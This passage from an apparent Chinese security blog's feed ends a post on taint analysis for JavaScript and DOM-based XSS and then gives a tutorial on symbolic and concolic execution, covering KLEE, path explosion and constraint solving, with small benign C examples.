方法动态地产生执行代码等.**由于动态特性代码只有在运行时才能获得具体信息,传统的静态污点分析无法精确地分析出其中可能存在的安全问题.<strong>针对 JavaScript 语言的动态特性问题,Chugh 等人提出了</strong>分阶段的污点分析方法.<strong>分阶段污点分析的主要思想是尽可</strong>能地在当前已知的代码上进行静态污点分析并提取定制的检查规则,然后在动态加载过程中进行规则检查.**静态污点分析阶段使用一种基于约束求解的方法分析两个集合:必须不能写入集合(must not write set)和必须不能读取集合(must not read set).制定的检查规则是动态代码中的变量不能流入或流出到上述集合中.在动态阶段实施快速的规则检查,如果代码满足了规则检查,那么整个系统就被认为是安全的.Wei 等人提出了利用混合的污点分析技术来解决 JavaScript 漏洞检测中的动态语言特性问题.<strong>混合分析的主要思想是利用动态分析生成执行踪迹,在执行踪迹的基础上利用静态方法进行污点分析</strong>.在动态分析阶段中,利用已有的测试集合动态执行并收集执行踪迹.每个网页的执行踪迹包括执行过的函数调用、创建对象的类型和静态不可见的动态加载执行代码,选择程序行为覆盖度较高的执行踪迹页面的子集.在静态污点分析阶段,通过分析执行踪迹子集建立调用图,并在调用图上实施静态的污点分析.</p><p><strong>基于 DOM 的 XSS 安全问题</strong>使得 JavaScript 的污点分析还需要考虑 JavaScript 与文档对象模型(DOM)的交互问题.Vogt 等人提出了一种简单的解决方案,<strong>它的实现思想是:如果一个 DOM 节点被污点标记,则需要为当前节点存储一个污点数据;如果当前节点在此之后被访问,那么它的返回值也会被污点标记</strong>.Lekies 等人提出了一种更为系统的解决方案,<strong>他们尝试通过修改浏览器源码来支持对基于 DOM 的 XSS 安全问题的污点分析</strong>,也称为动态的字符串级别的污点分析方法.该方法将 14 个污点源(例如 location.href,location.hash,document.referrer等)压缩成单字节,并将其标记成污点字符串.污点标记的传播规则是基于字符串实现的.**该方法改变了JavaScript 引擎 V8的底层字符串类型实现,扩展其字符串创建和分配内存方法.**同时,改变支持 DOM 的 WebKit库中字符串类的实现,增加一个数组存储成员变量的污点标记. </p><h2 id="0X04-总结"><a href="#0X04-总结" class="headerlink" title="0X04 总结"></a><strong>0X04 总结</strong></h2><p>污点分析作为信息流分析的一种实践技术,被广泛应用于互联网及移动终端平台上应用程序的信息安全保障中.本文介绍了污点分析的基本原理和通用技术,并针对近年来污点分析在解决实际应用程序安全问题时遇到的问题和关键解决技术进行了分析综述.不同于基于安全类型系统的信息流分析技术,污点分析可以不改变程序现有的编程模型或语言特性,并提供精确信息流传播跟踪.在实际应用过程中,污点分析还需要借助传统的程序分析技术的支持,例如静态分析中的数据流分析、动态分析中的代码重写等技术.另外,结合测试用例生成技术、符号执行技术以及虚拟机技术,也会给污点分析带来更多行之有效的解决方案. </p><h2 id="0X05-参考链接"><a href="#0X05-参考链接" class="headerlink" title="0X05 参考链接"></a><strong>0X05 参考链接</strong></h2><p><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.5_taint_analysis.md">https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.5_taint_analysis.md</a><br><a href="http://netinfo-security.org/article/2016/1671-1122-0-3-77.html#close">http://netinfo-security.org/article/2016/1671-1122-0-3-77.html#close</a><br><a href="http://www.jos.org.cn/ch/reader/create_pdf.aspx?file_no=5190&journal_id=jos">http://www.jos.org.cn/ch/reader/create_pdf.aspx?file_no=5190&amp;journal_id=jos</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>污点分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单理解符号执行技术</title>
    <link href="/2019/02/28/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/02/28/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>因为最近看的很多静态检测的论文中涉及到了符号执行的概念，而在我第一次听到符号执行实际上是在我的一些搞二进制学长口中，自然认为是和 web 没啥关系，但是现在看来只是因为我我太菜了，很多知识在更高的层次看起来都是交融的，而不是我现在看到的全部都是互不相关的板块，或许这也就是为什么要读研吧，<strong>不读研那就疯狂努力吧</strong>。好了，废话不多讲了，由于我对符号执行的理解没有达到很高的层次，不能进行更详尽的总结分析**，故我只能在网上找了一些我个人认为总结的比较好，并且通俗易懂的文章进行一些摘录，**在此之前先对这些优秀的作者表示感谢，文章之后我会附上我引用的文章或者论文的链接。</p><h2 id="0X01-通俗地解释符号执行"><a href="#0X01-通俗地解释符号执行" class="headerlink" title="0X01 通俗地解释符号执行"></a><strong>0X01 通俗地解释符号执行</strong></h2><p>Wiki中的定义是：在计算机科学中，符号执行技术指的是通过程序分析的方法，确定哪些输入向量会对应导致程序的执行结果为某个向量的方法(绕)。通俗的说，<strong>如果把一个程序比作DOTA英雄，英雄的最终属性值为程序的输出（包括攻击力、防御力、血槽、蓝槽），英雄的武器出装为程序的输入（出A杖还是BKB）。那么符号执行技术的任务就是，给定了一个英雄的最终属性值，分析出该英雄可以通过哪些出装方式达到这种最终属性值效果。</strong></p><span id="more"></span><p>可以发现，<strong>符号执行技术是一种白盒的静态分析技术</strong>。即，分析程序可能的输入需要能够获取到目标源代码的支持。<strong>同时，它是静态的，因为并没有实际的执行程序本身，而是分析程序的执行路径</strong>。如果把上述英雄的最终属性值替换成程序形成的bug状态，比如，存在数组越界复制的状态，那么，我们就能够利用此技术挖掘漏洞的输入向量了。</p><p>这里再举一个简单的例子，让大家有深刻的理解。</p><p><strong>以下面的源代码为例子：</strong></p><pre><code class="hljs">int m=M, n=N, q=Q; int x1=0,x2=0,x3=0;if(m!=0)&#123;    x1=-2;&#125;if(n&lt;12)&#123;    if(!m &amp;&amp; q)    &#123;        x2=1;    &#125;    x3=2;&#125;assert(x1+x2+x3!=3)</code></pre><p>上述代码是一个简单的c语言分支结构代码，它的输入是M,N,Q三个变量；输出是x1,x2,x3的三个变量的和。我们这里设置的条件是想看看什么样的输入向量&lt;M,N,Q&gt;的情况下，得到的三个输出变量的和等于3. </p><p><strong>那么我们通过下面的树形结构来看看所有的情况：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C1.png" alt="此处输入图片的描述"></p><p>上面的分析图把所有可能的情况都列举出来了，其中，叶子节点显示的数值表示当前输入情况下，可以得到的数值。（比如，如果英雄出装是M^(N&lt;12)，那么最终的属性值R&#x3D;0）。其中M^(N&lt;12)表达的是，M是非零值且N要小于12，Q为任意值的情况下，得到R&#x3D;0。可以发现，当条件为~M^(N&lt;5)^Q时，得到了最终结果等于3.即，我们通过这种方式逆向发现了输入向量。<strong>如果把结果条件更改为漏洞条件，理论上也是能够进行漏洞挖掘了。</strong></p><p>对于如何根据最终得到的结果求解输入向量，已经有很多现成的数学工具可以使用。上述问题其实可以规约成约束规划的求解问题（更详细的介绍看这里：<a href="https://en.wikipedia.org/wiki/Constraint_programming">Constraint_programming</a> ）。比较著名的工具比如SMT（Satisfiability Modulo Theory，可满足性模理论）和SAT。</p><p>但是在实际的漏洞分析过程中，目标程序可能更加复杂，没有我们上面的例子这么简单。<strong>实际的程序中，可能包含了与外设交互的系统函数，而这些系统函数的输入输出并不会直接赋值到符号中，从而阻断了此类问题的求解</strong>。</p><p><strong>比如下面的这个包含了文件读写的例子：</strong></p><pre><code class="hljs">int main(int argc, char* argv[])&#123;    FILE *fop = fopen(&quot;test.txt&quot;);    ...    if(argc &gt; 3)    &#123;        fputs(&quot;Too many parameters, exit.&quot;, fop);    &#125;    else    &#123;        fputs(&quot;Ok, we will run normally.&quot;, fop);    &#125;    ...    output = fgets(..., fop);    assert(！strcmp(output, &quot;Ok, we will run normally.&quot;));    return 0;&#125;</code></pre><p>上述示例代码中，想要发现什么情况下会得到输出”Ok, we will run normally.”这个字符串。通过一系列的执行到if语句，此时，根据输入的参数个数将会产生两个分支。分支语句中将执行系统的文件写操作。**在传统的符号执行过程中，此类函数如果继续沿着系统函数的调用传递下去的话，符号数值的传递将会丢失。**而在之后的output &#x3D; fgets(…, fop);这行代码中，符号从外部获得的数值也将无法正常的赋值到output中。因此，符号执行无法求解上述问题，<strong>因为在调用系统函数与外设交互的时候，符号数值的赋值过程被截断了。</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C2.png" alt="此处输入图片的描述"></p><p>为了解决这个问题，最经典的项目就是基于LLVM的KLEE（<a href="https://github.com/klee/klee">klee</a>)它把一系列的与外设有关的系统函数给重新写了一下，使得符号数值的传递能够继续下去。从比较简化的角度来说，就是把上面的fputs函数修改成，字符串赋值到某个变量中，比如可以是上面的fop里面。再把fgets函数修改成从某个变量获取内容，比如可以是把fop的地址给output。这样，就能够把符号数值的传递给续上。当然，这里举的例子是比较简单的例子，实际在重写函数的时候，会要处理更复杂的情况。在KLEE中，它重新对40个系统调用进行了建模，比如open, read, write, stat, lseek, ftruncate, ioctl。感兴趣的读者可以进一步阅读他们发表在OSDI2008年的论文（<a href="https://www.usenix.org/legacy/event/osdi08/tech/full_papers/cadar/cadar.pdf">KLEE-OSDI08</a>)他们的文章深入浅出，非常适合学习。</p><h2 id="0X02-从公式原理上理解符号执行"><a href="#0X02-从公式原理上理解符号执行" class="headerlink" title="0X02 从公式原理上理解符号执行"></a><strong>0X02 从公式原理上理解符号执行</strong></h2><p>符号执行的关键思想就是，<strong>把输入变为符号值，那么程序计算的输出值就是一个符号输入值的函数</strong>。这个符号化的过程在上一篇AEG文章中已有简要阐述，简而言之，就是一个程序执行的路径通常是true和false条件的序列，这些条件是在分支语句处产生的。在序列的i^{th} 位置如果值是true，那么意味着i^{th} 条件语句走的是then这个分支；反之如果是false就意味着程序执行走的是else分支。</p><p>那么，如何形式化地表示符号执行的过程呢？程序的所有执行路径可以表示为树，叫做执行树。接下来我们就以一个例子来阐述通过符号执行遍历程序执行树的过程。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C3.png" alt="此处输入图片的描述"></p><p>左边的代码中，testme()函数有3条执行路径，组成了右图中的执行树。直观上来看，我们只要给出三个输入就可以遍历这三个路径，即图中绿色的x和y取值。符号执行的目标就是能够生成这样的输入集合，在给定的时间内探索所有的路径。</p><p>为了形式化地完成这个任务，符号执行会在全局维护两个变量**。其一是符号状态 $\sigma$ ，它表示的是一个从变量到符号表达式的映射**。其二是符号化路径约束<strong>PC，这是一个无量词的一阶公式，用来表示路径条件</strong>。在符号执行的开始，符号状态$\sigma$ 会先初始化为一个空的映射，而符号化路径约束PC初始化为true。<strong>$\sigma$ 和PC在符号执行的过程中会不断更新。</strong></p><p><strong>在符号执行结束时，PC就会用约束求解器进行求解，以生成实际的输入值。这个实际的输入值如果用程序执行，就会走符号执行过程中探索的那条路径，即此时PC的公式所表示的路径</strong></p><p>我们以左图的例子来阐述这个过程。当符号执行开始时，符号状态$\sigma$ 为空，符号路径约束PC为true。当我们遇到一个读语句，形式为var&#x3D;sym_input()，即接收程序输入，符号执行就会在符号状态$\sigma$ 中加入一个映射$var\rightarrow s$，这里s就是一个新的未约束的符号值。左图中代码，main()函数的前两行会得到结果$\sigma &#x3D;\left{ x\rightarrow x_{0}, y\rightarrow y_{0}\right}$，其中$x_{0}$ 和$y_{0}$ 是两个初始的未约束的符号化值。</p><p>当我们遇到一个赋值语句，形式为 v&#x3D;e，符号执行就会将符号状态$\sigma$ 更新，加入一个v到$\sigma \left( e \right)$ 的映射**，其中$\sigma \left( e \right)$ 就是在当前符号化状态计算e得到的表达式**。例如，在左图中代码执行完第6行时，$\sigma &#x3D;\left{  x \rightarrow x_{0},  y \rightarrow y_{0},  z \rightarrow 2y_{0}\right}$ 。</p><p>当我们遇到条件语句if(e) S1 else S2，PC会有两个不同更新**。首先是PC更新为PC$\wedge \sigma \left( e \right)$，这就表示then分支**；然后是建立一个路径约束PC’<strong>，初始化为PC$\wedge \neg \sigma \left( e \right)$ ，这就表示else分支</strong>。如果PC是可满足的，给一些实际值，那么程序执行就会走then分支，此时的状态为：符号状态$\sigma$ 和符号路径约束PC。反之如果PC’是可满足的，那么会建立另一个符号实例，其符号状态为$\sigma$ ，符号路径约束为PC’，走else分支。如果PC和PC’都不能满足，那么执行就会在对应路径终止。例如，第7行建立了两个不同的符号执行实例，路径约束分别是$x_{0} &#x3D;2y_{0}$和$x_{0} \ne 2y_{0}$。在第8行，又建立了两个符号执行实例，路径约束分别是$\left( x_{0} &#x3D;2y_{0} \right) \wedge \left( x_{0}&gt;y_{0}+10 \right)$ ，以及$\left( x_{0} &#x3D;2y_{0} \right) \wedge \left( x_{0} \leq y _{0}+10 \right)$ 。</p><p>如果符号执行遇到了exit语句或者错误（指的是程序崩溃、违反断言等），符号执行的当前实例会终止，利用约束求解器对当前符号路径约束赋一个可满足的值，而可满足的赋值就构成了测试输入：如果程序执行这些实际输入值，就会在同样的路径结束。例如，在左图例子中，经过符号执行的计算会得到三个测试输入：{x&#x3D;0, y&#x3D;1}, {x&#x3D;2, y&#x3D;1}, {x&#x3D;30, y&#x3D;15}。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C4.png" alt="此处输入图片的描述"></p><p>当我们遇到了循环和递归应该怎么办呢？<strong>如果循环或递归的终止条件是符号化的，包含循环和递归的符号执行会导致无限数量的路径</strong>。比如上图中的这个例子，这段代码就有无数条执行路径，每条路径的可能性有两种：要么是任意数量的true加上一个false结尾，要么是无穷多数量的true。我们形式化地表示包含n个true条件和1个false条件的路径，<strong>其符号化约束如下：</strong></p><p>$$(\wedge_ {i\in [1,n]}N_{i} &gt;0) \wedge (N_{n+1}\leq 10)$$</p><p>其中每个$N_{i}$ 都是一个新的符号化值，执行结尾的符号化状态是$\left{ N\rightarrow N_{n+1} ,sum\rightarrow \sum_{i\in [1,n]}^{}{N_{i}}  \right}$ 。其实这就是符号执行面临的问题之一，即如何处理循环中的无限多路径。在实际中，<strong>有一些方法可以应对，比如对搜索加入限制，要么是限制搜索时间的长短，要么是限制路径数量、循环迭代次数、探索深度等等。</strong></p><p>还需要考虑到的一个问题就是，<strong>如果符号路径约束包含不能由求解器高效求解的公式怎么办</strong>？比如说，如果原本的代码发生变化，把twice函数替换为下图中的语句，那么符号执行就会产生路径约束$x_{0}\ne (y_{0} y_{0}) mod 50$以及$x_{0}&#x3D; (y_{0} y_{0}) mod 50$。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C5.png" alt="此处输入图片的描述"></p><p>我们做另外一个假设，如果twice是一个我们得不到源码的函数，也就是我们不知道这个函数有什么功能，那么符号执行会产生路径约束$x_{0}\ne twice(y_{0})$ 和 $x_{0}&#x3D; twice(y_{0})$ ，其中twice是一个未解释的函数。这两种情况下，约束求解器都是不能求解这样的约束的，所以符号执行不能产生输入。</p><p><strong>解决方法是一种叫做动态符号执行的技术，我们会在后面的小节中介绍。</strong></p><h2 id="0X03-符号执行的具体流程"><a href="#0X03-符号执行的具体流程" class="headerlink" title="0X03 符号执行的具体流程"></a><strong>0X03 符号执行的具体流程</strong></h2><p>符号执行分为<strong>过程内分析</strong>和<strong>过程间分析</strong>（又称全局分析）。**过程内分析是指只对单个过程的代码进行分析，全局分析指对整个软件代码进行上下文敏感的分析。**所谓上下文敏感分析是指在当前函数入口点要考虑当前的函数间调用信息和环境信息等。程序的全局分析是在过程内分析的基础上进行的，如果过程内分析中包含了函数调用，就引入了过程间分析，<strong>因此两者之间是相对独立又相互依赖的关系。</strong></p><h3 id="1-过程内分析流程如下图所示"><a href="#1-过程内分析流程如下图所示" class="headerlink" title="(1)过程内分析流程如下图所示"></a><strong>(1)过程内分析流程如下图所示</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C6.png" alt="此处输入图片的描述"></p><p><strong>首先，对待分析的单个过程代码对象构建控制流图（Control Flow Graph，CFG）</strong>。控制流图（CFG）是编译器内部用有向图表示一个程序过程的一种抽象数据结构，图中的节点表示一个程序基本块，基本块是没有任何跳转的顺序语句代码块，图中的边表示代码中的跳转，它是有向边，起点和终点都是基本块。在CFG上从入口节点开始模拟执行，<strong>在遇到分支节点时，使用约束求解器判定哪条分支可行，并根据预先设计的路径调度策略实现对该过程所有路径的遍历分析</strong>，最后输出每条可执行路径的分析结果。其中约束求解是数学上的判定过程，形象地说是对一系列的约束方程进行求解。</p><p><strong>如果要进行源代码的安全性检测，则需要在过程内分析时，根据具体的安全知识库来添加安全约束</strong>。例如，如果要添加缓冲区溢出的安全约束，则在执行时遇到对内存进行操作的语句时，就要对该语句所操作的内存对象的边界添加安全约束。以上面的方式来进行安全约束的添加，<strong>并且每次在添加之后就使用约束求解器对所有的安全约束进行求解，以判定当前是否可能潜在一个安全问题。</strong></p><h3 id="2-程序全局分析流程如下图所示："><a href="#2-程序全局分析流程如下图所示：" class="headerlink" title="(2)程序全局分析流程如下图所示："></a><strong>(2)程序全局分析流程如下图所示：</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C7.png" alt="此处输入图片的描述"></p><p><strong>首先，为整个程序代码构建函数调用图（Call Graph，CG），在函数调用图中，节点表示函数，边表示函数间的调用关系</strong>。根据预设的全局分析调度策略，对CG中的<strong>每个节点（对应一个函数）进行过程内分析</strong>，最终给出CG每种可行的调用序列的分析结果。</p><h2 id="0X04-动态符号执行"><a href="#0X04-动态符号执行" class="headerlink" title="0X04 动态符号执行"></a><strong>0X04 动态符号执行</strong></h2><p>符号执行在发展过程中出现了一种叫做动态符号执行的方法（concrete and symbolic， concolic）。<strong>动态符号执行是以具体数值作为输入来模拟执行程序代码</strong>，与传统静态符号执行相比，其输入值的表示形式不同。动态符号执行使用具体值作为输入，同时启动代码模拟执行器，并从当前路径的分支语句的谓词中搜集所有符号约束。然后修改该符号约束内容构造出一条新的可行的路径约束，并用约束求解器求解出一个可行的新的具体输入，接着符号执行引擎对新输入值进行一轮新的分析。通过使用这种输入迭代产生变种输入的方法，理论上所有可行的路径都可以被计算并分析一遍。</p><p><strong>动态符号执行相对于静态符号执行的优点是每次都是具体输入的执行</strong>，在模拟执行这个过程中**，符号化的模拟执行比具体化的模拟执行的开销大很多**；并且模拟执行过程中所有的变量都为具体值，而不必使用复杂的数据结构来表达符号值，使得模拟执行的花销进一步减少。<strong>但是动态符号执行的结果是对程序的所有路径的一个下逼近，即其最后产生路径的集合应该比所有路径集合小，</strong>(但这种情况在软件测试中是允许的)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C3.png" alt="此处输入图片的描述"></p><p><strong>我们依旧以上图的这个程序的例子来说明</strong>。Concolic执行会先产生一些随机输入，例如{x&#x3D;22, y&#x3D;7}，然后同时实际地和符号化地执行程序。这个实际执行会走到第7行的else分支，符号化执行会在实际执行路径生成路径约束$x_{0} \ne 2 y_{0}$。然后concolic执行会将路径约束的连接词取反，求解$x_{0} &#x3D; 2 y_{0}$得到一个测试输入{x&#x3D;2, y&#x3D;1}，这个新输入就会让执行走向一条不同的路径。之后，concolic执行会在这个新的测试输入上再同时进行实际的和符号化的执行，执行会取与此前路径不同的分支，即第7行的then分支和第8行的else分支，这时产生的约束就是$(x_{0}&#x3D;2y_{0})\wedge (x_{0}\leq y_{0}+10)$，生成新的测试输入让程序执行没有被执行过的路径。再探索新的路径，就需要将上述的条件取反，也就是$(x_{0}&#x3D;2y_{0})\wedge (x_{0}&gt; y_{0}+10)$，通过求解约束得到测试输入{x&#x3D;30, y&#x3D;15}，程序会在这个输入上遇到ERROR语句。如此一来，我们就完成了所有3条路径的探索。</p><p>这个过程中，我们从一个实际输入{x&#x3D;22, y&#x3D;7}出发，得到第一个约束条件$x_{0} \ne 2 y_{0}$，第一次取反得到$x_{0} &#x3D; 2 y_{0}$，从而得到测试输入{x&#x3D;2, y&#x3D;1}和新约束$(x_{0}&#x3D;2y_{0})\wedge (x_{0}\leq y_{0}+10)$；$(x_{0}&#x3D;2y_{0})\wedge (x_{0}&gt; y_{0}+10)$，从而求解出测试输入{x&#x3D;30, y&#x3D;15}。</p><p>注意在这个搜索过程中**，其实concolic执行使用了深度优先的搜索策略。**</p><p>Cristian Cadar在2006年发表EXE，以及2008年发表EXE的改进版本KLEE，对上述concolic执行的方法做了进一步优化。其创新点主要是在实际状态和符号状态之间进行区分，称之为执行生成的测试（Execution-Generated Testing），简称EGT。这个方法在每次运算前动态检查值是不是都是实际的，如果都是实际的值，那么运算就原样执行，否则，如果至少有一个值是符号化的，运算就会通过更新当前路径的条件符号化地进行。例如，对于我们的例子程序，第17行把y&#x3D;sym_input()改变成y&#x3D;10，那么第6行就会用实际参数20去调用函数twice，并实际执行。然后第7行变成if(20&#x3D;&#x3D;x)，符号执行会走then路径，加入约束x&#x3D;20；对条件进行取反就可以走else路径，约束是x≠20。在then路径，第8行变成if(x&gt;20)，那么then路径就不能走了，因为此时有约束x&#x3D;20。简言之，EGT本质上还是将实际执行与符号执行相结合，通过路径取反探索所有可能路径。</p><p>正是因为concolic执行的出现，让传统静态符号执行遇到的<strong>很多问题能够得到解决——那些符号执行不好处理的部分、求解器无法求解的部分，用实际值替换就好了</strong>。使用实际值，可以让因外部代码交互和约束求解超时造成的不精确大大降低，但<strong>付出的代价就是，会有丢失路径的缺陷，牺牲了路径探索的完全性</strong>。</p><p>我们举一个例子来说明这一点。假设我们原始例子程序做了改动，即把twice函数的定义改为返回(v*v)%50。假设执行从随机输入{x&#x3D;22, y&#x3D;7}开始，生成路径约束$x_{0}\ne (y_{0} y_{0}) mod 50$。因为约束求解器无法求解非线性约束，所以concolic执行的应对方法是，把符号值用实际值替换，此处会把$y_{0}$的值替换为7，这就将程序约束简化为$x_{0}\ne49$。通过求解这个约束，可以得到输入${x&#x3D;49, y&#x3D;7}$，走到一个此前没有走到的路径。传统静态符号执行是无法做到这一步的。但是，在这个例子中，我们无法生成路径true, false的输入，即约束$x_{0}&#x3D; (y_{0} y_{0}) mod 50\wedge (x_{0}\leq y_{0}+10)$，因为$y_{0}$的值已经实际化了，这就造成了丢失路径的问题，造成不完全性。</p><p>然而总的来说，concolic执行的方法是非常实用的，有效解决了遇到不支持的运算以及应用与外界交互的问题。比如调用库函数和OS系统调用的情况下，因为库和系统调用无法插桩，所以这些函数相关的返回值会被实际化。</p><h2 id="0X05-挑战-解决方案"><a href="#0X05-挑战-解决方案" class="headerlink" title="0X05 挑战&amp;解决方案"></a><strong>0X05 挑战&amp;解决方案</strong></h2><p>符号执行曾经遇到过很多问题，使其难以应用在真实的程序分析中。经过研究者的不懈努力，这些问题多多少少得到了解决，由此也产生了一大批优秀的学术论文。这一部分将简单介绍其中的一些关键挑战以及对应的解决方案。</p><h3 id="1-路径选择"><a href="#1-路径选择" class="headerlink" title="1.路径选择"></a><strong>1.路径选择</strong></h3><p>由于在<strong>每一个条件分支都会产生两个不同约束，符号执行要探索的执行路径依分支数指数增长</strong>。在时间和资源有限的情况下，<strong>应该对最相关的路径进行探索</strong>，这就涉及到了路径选择的问题。通过路径选择的方法缓解指数爆炸问题，<strong>主要有两种方法：</strong></p><p>1）使用<strong>启发式函数</strong>对路径进行搜索，目的是先探索最值得探索的路径；<br>2）使用一些<strong>可靠的程序分析技术</strong>减少路径探索的复杂性。</p><p>**启发式搜索是一种路径搜索策略，比深度优先或者广度优先要更先进一些。**大多数启发式的主要目标在于获得较高的语句和分支的覆盖率，不过也有可能用于其他优化目的。最简单的启发式大概是随机探索的启发式，即在两边都可行的符号化分支随机选择走哪一边。还有一个方法是，使用静态控制流图（CFG）来指导路径选择，<strong>尽量选择与未覆盖指令最接近的路径</strong>，<strong>另一个方法是符号执行与进化搜索相结合</strong>,其fitness function用来指导输入空间的搜索，其关键就在于fitness function的定义，例如利用从动态或静态分析中得到的实际状态信息或者符号信息来提升fitness function。</p><p><strong>用程序分析和软件验证的思路去减少路径探索的复杂性，也是一种缓解路径爆炸问题的方式。</strong></p><p>**(1)通过静态融合减少需要探索的路径:**具体说来就是使用select表达式直接传递给约束求解器，但实际上是将路径选择的复杂性传递给了求解器，对求解器提出了更高的要求。</p><p>**(2)重用:**即通过缓存等方式存储函数摘要，可以将底层函数的计算结果重用到高级函数中，不需要重复计算，减小分析的复杂性。</p><p><strong>(3)去除冗余路径：</strong> RWset技术的关键思路就是，如果程序路径与此前探索过的路径在同样符号约束的情况下到达相同的程序点，那么这条路径就会从该点继续执行，所以可以被丢弃。</p><h3 id="2-约束求解"><a href="#2-约束求解" class="headerlink" title="2.约束求解"></a><strong>2.约束求解</strong></h3><p>符号执行在2005年之后的突然重新流行，一大部分原因是因为求解器能力的提升，能够求解复杂的路径约束。但是<strong>约束求解在某种程度上依然是符号执行的关键瓶颈之一</strong>，也就是说符号执行所需求的约束求解能力超出了当前约束求解器的能力。所以，<strong>实现约束求解优化就变得十分重要</strong>。</p><p>这里主要介绍两种优化方法：<strong>不相关约束消除</strong>，<strong>增量求解</strong>。</p><h4 id="1-不相关约束消除"><a href="#1-不相关约束消除" class="headerlink" title="1.不相关约束消除"></a><strong>1.不相关约束消除</strong></h4><p>在符号执行的约束生成过程中，尤其是在concolic执行过程中，<strong>通常会通过条件取反的方式增加约束</strong>，一个已知路径约束的分支谓词会取反，然后结果的约束集会检查可满足性以识别另一条路径是否可行。一个很重要的现象是，<strong>一个程序分支通常只依赖一小部分程序变量，所以我们可以尝试从当前路径条件中移除与识别当前分支结果不相关的约束</strong>。</p><p>例如，当前的路径条件是$(x+y&gt;10)\wedge (z&gt;0)\wedge (y&lt;12) \wedge (z-x&#x3D;0)$,我们想对某个条件取反以探索新的路径，即求解$(x+y&gt;10)\wedge (z&gt;0)\wedge \neg (y&lt;12)$ 产生新输入，其中$\neg (y&lt;12)$ 是取反的条件分支，那么**我们就可以去掉对z的约束，因为对$\neg (y&lt;12)$ 的分支是不会有影响的。**减小的约束集会给出x和y的新值，我们用此前执行的z值就可以生成新输入了。如果更形式化地说，算法会计算在取反条件所依赖的所有约束的传递闭包。</p><h4 id="2-增量求解"><a href="#2-增量求解" class="headerlink" title="2.增量求解"></a><strong>2.增量求解</strong></h4><p>另一种方法本质上也是利用重用的思想**。符号执行中生成的约束集有一个重要特性，就是表示为程序源代码中的静态分支的固定集合。所以，很多路径有相似的约束集，可以有相似的解决方案**。<strong>通过重用以前相似请求的结果，可以利用这种特性来提升约束求解的速度</strong>，这种方法在CUTE和KLEE中都有实现。</p><p>举个例子来说明，在KLEE中，所有的请求结果都保存在缓存中，该缓存将约束集映射到实际变量赋值。例如，缓存中的一个映射可能是$(x+y&lt;10)\wedge (x&gt;5)\Rightarrow\left{ x&#x3D;6, y&#x3D;3 \right}$使用这些映射，KLEE可以迅速解答一些相似的请求类型，包括已经缓存的约束集的子集和超集。比如对于请求$(x+y&lt;10)\wedge (x&gt;5)\wedge(y\geq 0)$，KLEE可以迅速检查{x&#x3D;6, y&#x3D;3}是一个可行的答案。这样就可以让求解过程加快很多。 </p><h4 id="3-内存建模"><a href="#3-内存建模" class="headerlink" title="3.内存建模"></a><strong>3.内存建模</strong></h4><p><strong>程序语句如何精确地翻译为符号化约束对符号执行得到的覆盖率有很大影响。<strong>内存建模就是一个很大的问题，在访问内存的时候，<strong>内存地址用来引用一个内存单元，当这个地址的引用来自于用户输入时，内存地址就成为了一个表达式。当符号化执行时，我们必须决定什么时候将这个内存的引用进行实际化</strong>。一个可靠的策略是，考虑从任何可能满足的赋值加载，但这个可能值的空间很大，如果实际化不够精确，会造成代码分析的不精确</strong>。还有一个是别名问题，即地址别名导致两个内存运算引用同一个地址，比较好的方法是进行别名分析</strong>，事先推理两个引用是否指向相同的地址，但这个步骤要静态分析完成。KLEE使用了别名分析和让SMT考虑别名问题的混合方法。而DART和CUTE压根没解决这个问题，只处理线性约束的公式，不能处理一般的符号化引用。</p><p><strong>符号化跳转也是一个问题，主要是switch这样的语句，常用跳转表实现，跳转的目标是一个表达式而不是实际值。</strong></p><p><strong>以往的工作用三种处理方法。</strong></p><p>1）使用concolic执行中的实际化策略，一旦跳转目标在实际执行中被执行，就可以将符号执行转向这个实际路径，但缺陷是实际化导致很难探索完全的状态空间，只能探索已知的跳转目标。</p><p>2）使用SMT求解器。当我们到达符号跳转时，假设路径谓词为$\Pi$,跳转到e，我们可以让SMT求解器找到符合$\Pi \wedge 